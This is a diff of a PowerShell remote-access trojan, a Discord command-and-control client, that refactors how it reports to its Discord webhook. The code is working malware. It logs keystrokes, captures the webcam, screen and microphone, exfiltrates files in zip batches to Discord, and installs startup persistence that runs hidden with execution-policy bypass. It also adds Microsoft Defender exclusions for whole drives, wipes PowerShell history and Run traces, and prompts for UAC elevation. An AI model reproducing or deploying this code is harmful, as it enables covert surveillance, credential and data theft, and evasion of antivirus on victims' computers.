@@ -1,53 +1,18 @@
-<# ============================================= Beigeworm's Discord C2 Client ========================================================
 
-**SYNOPSIS**
-Using a Discord bot along with discords API and a webhook to Act as a Command and Control Platform.
+# ================================================================ Discord C2 ======================================================================
 
-INFORMATION
-This script uses a discord bot along with discords API and a webhook to create a chat that can control a windows pc.
-Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.
-
-SETUP
-1. make a discord bot at https://discord.com/developers/applications/
-2. add the bot to your discord server (with intents enabled and messaging and file upload permissions)
-3. create a webhook in the desired channel on your server. ( channel-settings/integrations )
-3. Change $dc below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
-4. Change $tk below with your bot token
-5. Change $ch below to the channel id of your webhook.
-
-USAGE
-1. Setup the script
-2. Run the script on a target.
-3. Check discord for 'waiting to connect..' message.
-4. Enter the computername to authenticate the session.
-5. Enter commands to interact with the target.
-
-EXTRA
-You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat
-Control all waiting sessions simultaneously with 'control-all' to mass authenticate sessions.
-Killswitch - Type 'kill' in chat to stop 'KeyCapture' or other commands listed in 'extrainfo'..
-#>
-
-# =============================================================================== SETUP VARIABLES ===================================================================================
-
-# CHANGE below and add your details (only if not defined in a stageer)
-$hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
 
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-
 # =============================================================== SCRIPT SETUP =========================================================================
 
+$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $version = "1.3.1" # Check version number
 $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-
-# Shortened webhook detection
-if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -59,10 +24,13 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
 # --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------
 
 Function Options {
-    $embed = @{
-        "title" = "Discord C2 Options"
-        "description" = @"
-``````Commands List:``````
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | Commands List "
+            "description" = @"
 - **SpeechToText**: Send audio transcript to Discord
 - **Systeminfo**: Send System info as text file to Discord
 - **FolderTree**: Save folder trees to file and send to Discord
@@ -112,21 +80,22 @@ Function Options {
 - **Pause**: Pause the current authenticated session
 - **Close**: Close this session
 "@
-        "color" = 16711680  # Red color
-    }
+            color       = 65280
+        }
+    )
+}
 
-    $jsonsys = @{
-        "username" = $env:COMPUTERNAME
-        "embeds" = @($embed)
-    } | ConvertTo-Json
-
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+sendMsg -Embed $jsonPayload
 }
 
 Function ExtraInfo {
-$embed = @{
-    "title" = "Exfiltrate and Upload Command Examples"
-    "description" = @"
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME | Extra Information "
+            "description" = @"
 ``````Example Commands``````
 
 **Default PS Commands:**
@@ -162,15 +131,12 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 - SendHydra
 - SpeechToText
 "@
-    "color" = 16711680  # Red color
+            color       = 65280
+        }
+    )
 }
 
-    $json = @{
-        "username" = $env:COMPUTERNAME
-        "embeds" = @($embed)
-    } | ConvertTo-Json
-    
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
+sendMsg -Embed $jsonPayload
 }
 
 Function CleanUp { 
@@ -179,8 +145,7 @@ Function CleanUp {
     Remove-Item (Get-PSreadlineOption).HistorySavePath
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
     
 }
 
@@ -193,7 +158,7 @@ Function FolderTree{
     $FilePath ="$env:temp/TreesOfKnowledge.zip"
     Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
     sleep 1
-    curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
+    sendFile -sendfilePath $FilePath | Out-Null
     rm -Path $FilePath -Force
     Write-Output "Done."
 }
@@ -231,8 +196,7 @@ param ([string]$Prefix)
     }
     $data | Export-Csv $FileOut -NoTypeInformation
     $results = Get-Content -Path $FileOut -Raw
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````$results``````"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message "``````$results``````"
     rm -Path $FileOut
 }
 
@@ -254,13 +218,11 @@ Function NearbyWifi {
     $wshell.SendKeys('{ESC}')
     $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
     $Wifi = ($NearbyWifi|Out-String)
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``````$Wifi``````"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message "``````$Wifi``````"
 }
 
 Function SystemInfo{
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
 Add-Type -AssemblyName System.Windows.Forms
 # WMI Classes
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
@@ -559,9 +521,8 @@ else{
     "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
 }
 
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage1"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-curl.exe -F file1=@"$outpath" $hookurl
+sendMsg -Message $infomessage1
+sendFile -sendfilePath $outpath
 Sleep 1
 Remove-Item -Path $outpath -force
 }
@@ -581,8 +542,7 @@ WshShell.SendKeys "{F11}"
     Start-Process -FilePath $pth
     sleep 3
     Remove-Item -Path $pth -Force
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"
 }
 
 Function Windows93 {
@@ -598,8 +558,7 @@ WshShell.SendKeys "{F11}"
     Start-Process -FilePath $pth
     sleep 3
     Remove-Item -Path $pth -Force
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Windows 93 Sent..`` :arrows_counterclockwise:"
 }
 
 Function WindowsIdiot {
@@ -615,14 +574,12 @@ WshShell.SendKeys "{F11}"
     Start-Process -FilePath $pth
     sleep 3
     Remove-Item -Path $pth -Force
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
 }
 
 Function SendHydra {
     Add-Type -AssemblyName System.Windows.Forms
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"
     function Create-Form {
         $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
         $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
@@ -637,8 +594,7 @@ Function SendHydra {
     
         $messages = PullMsg
         if ($messages -match "kill") {
-            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"} | ConvertTo-Json
-            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            sendMsg -Message ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"
             $previouscmd = $response
             break
         }
@@ -655,48 +611,41 @@ Function SendHydra {
 
 Function Message([string]$Message){
     msg.exe * $Message
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"
 }
 
 Function SoundSpam {
     param([Parameter()][int]$Interval = 3)
-        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Spamming Sounds... Please wait..`` :white_check_mark:"
     Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Sound Spam Complete!`` :white_check_mark:"
 }
 
 Function VoiceMessage([string]$Message){
     Add-Type -AssemblyName System.speech
     $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
     $SpeechSynth.Speak($Message)
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Message Sent!`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Message Sent!`` :white_check_mark:"
 }
 
 Function MinimizeAll{
     $apps = New-Object -ComObject Shell.Application
     $apps.MinimizeAll()
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Apps Minimised`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Apps Minimised`` :white_check_mark:"
 }
 
 Function EnableDarkMode {
     $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
     Set-ItemProperty $Theme AppsUseLightTheme -Value 0
     Start-Sleep 1
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Dark Mode Enabled`` :white_check_mark:"
 }
 
 Function DisableDarkMode {
     $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
     Set-ItemProperty $Theme AppsUseLightTheme -Value 1
     Start-Sleep 1
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":octagonal_sign: ``Dark Mode Disabled`` :octagonal_sign:"
 }
 
 Function VolumeMax {
@@ -725,8 +674,7 @@ Function ShortcutBomb {
         Start-Sleep 0.2
         $n++
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Shortcuts Created!`` :white_check_mark:"
 }
 
 Function Wallpaper {
@@ -734,8 +682,7 @@ param ([string[]]$url)
 $outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
 $signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
 Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
 }
 
 Function Goose {
@@ -747,14 +694,12 @@ Function Goose {
     Expand-Archive -Path $zipFile -DestinationPath $extractPath
     $vbscript = "$extractPath\Goose.vbs"
     & $vbscript
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys    
+    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
 }
 
 Function ScreenParty {
 Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys  
+    sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
 }
 
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
@@ -778,23 +723,20 @@ objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%
     $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
     rm -path "$env:TEMP\temp.ps1" -Force
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``Persistance Added!`` :white_check_mark:"
 }
 
 Function RemovePersistance{
     rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
     rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"
 }
 
 # --------------------------------------------------------------- USER FUNCTIONS ------------------------------------------------------------------------
 
 Function Exfiltrate {
     param ([string[]]$FileType,[string[]]$Path)
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Started..`` :file_folder:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
     $maxZipFileSize = 25MB
     $currentZipSize = 0
     $index = 1
@@ -819,7 +761,7 @@ Function Exfiltrate {
                 if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                     $zipArchive.Dispose()
                     $currentZipSize = 0
-                    curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
+                    sendFile -sendfilePath $zipFilePath | Out-Null
                     Sleep 1
                     Remove-Item -Path $zipFilePath -Force
                     $index++
@@ -831,8 +773,7 @@ Function Exfiltrate {
                 $currentZipSize += $fileSize
                 $messages = PullMsg
                 if ($messages -match "kill") {
-                    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
-                    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                    sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                     $previouscmd = $response
                     break
                 }
@@ -840,7 +781,7 @@ Function Exfiltrate {
         }
     }
     $zipArchive.Dispose()
-    curl.exe -F file1=@"$zipFilePath" $hookurl | Out-Null
+    sendFile -sendfilePath $zipFilePath | Out-Null
     sleep 5
     Remove-Item -Path $zipFilePath -Force
 }
@@ -857,7 +798,7 @@ param ([string[]]$Path)
             sleep 1
             Rm -Path $tempZipFilePath -Recurse -Force
         }else{
-            curl.exe -F file1=@"$Path" $hookurl | Out-Null
+            sendFile -sendfilePath $Path | Out-Null
         }
     }
 }
@@ -874,8 +815,7 @@ Function SpeechToText {
         if ($result) {
             $results = $result.Text
             Write-Output $results
-            $jsonsys = @{"username" = $env:COMPUTERNAME ; "content" = "``````$results``````"} | ConvertTo-Json
-            irm -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body $jsonsys
+            sendMsg -Message "``````$results``````"
         }
         $messages = PullMsg
         if ($messages -match "kill") {
@@ -899,7 +839,7 @@ Function TakePicture {
     $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
     [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
     sleep 1
-    curl.exe -F "file1=@$imagePath" $hookurl | Out-Null
+    sendFile -sendfilePath $imagePath | Out-Null
     sleep 3
     Remove-Item -Path "$env:TEMP\webcam.dll"
     Remove-Item -Path $imagePath -Force
@@ -910,16 +850,13 @@ Function Screenshot {
     If (!(Test-Path $Path)){  
         GetFfmpeg
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-    
+    sendMsg -Message ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"
     $mkvPath = "$env:Temp\ScreenClip.jpg"
     .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
     sleep 2
-    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
+    sendFile -sendfilePath $mkvPath | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
-
 }
 
 Function RecordAudio{
@@ -929,15 +866,14 @@ param ([int[]]$t)
         GetFfmpeg
     }
     sleep 1
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"
     Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
     function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
     $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
     $mp3Path = "$env:Temp\AudioClip.mp3"
     if ($t.Length -eq 0){$t = 10}
     .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
-    curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
+    sendFile -sendfilePath $mp3Path | Out-Null
     sleep 5
     rm -Path $mp3Path -Force
 }
@@ -948,20 +884,17 @@ param ([int[]]$t)
     If (!(Test-Path $Path)){  
         GetFfmpeg
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-    
+    sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
     $mkvPath = "$env:Temp\ScreenClip.mkv"
     if ($t.Length -eq 0){$t = 10}
     .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
-    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
+    sendFile -sendfilePath $mkvPath | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
 }
 
 Function KeyCapture {
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Started`` :mag_right:"} | ConvertTo-Json
-    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":mag_right: ``Keylogger Started`` :mag_right:"
     $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
     $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
     $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -993,8 +926,7 @@ Function KeyCapture {
             }
             $messages = PullMsg
             if ($messages -match "kill") {
-            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
-            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            sendMsg -Message ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"
             $previouscmd = $response
             $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
@@ -1011,8 +943,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
             $messages = PullMsg
             If (($keyPressed) -and (!($messages -match "kill"))) {
                 $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keys Captured :`` $escmsgsys"} | ConvertTo-Json
-                Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+                sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                 $keyPressed = $false
                 $nosave = ""
             }
@@ -1026,12 +957,10 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
 
 Function IsAdmin{
     If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
-        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
     }
     else{
-        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
-        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
     }
 }
 
@@ -1052,8 +981,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$cha
         & $pth
         Sleep 7
         rm -Path $pth
-        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"} | ConvertTo-Json
-        irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+        sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
         exit
     }
     catch{
@@ -1063,8 +991,7 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$cha
 
 Function ExcludeCDrive {
     Add-MpPreference -ExclusionPath C:\
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
 }
 
 Function ExcludeALLDrives {
@@ -1073,91 +1000,103 @@ Function ExcludeALLDrives {
     Add-MpPreference -ExclusionPath E:\
     Add-MpPreference -ExclusionPath F:\
     Add-MpPreference -ExclusionPath G:\
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"} | ConvertTo-Json
-    irm -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
 }
 
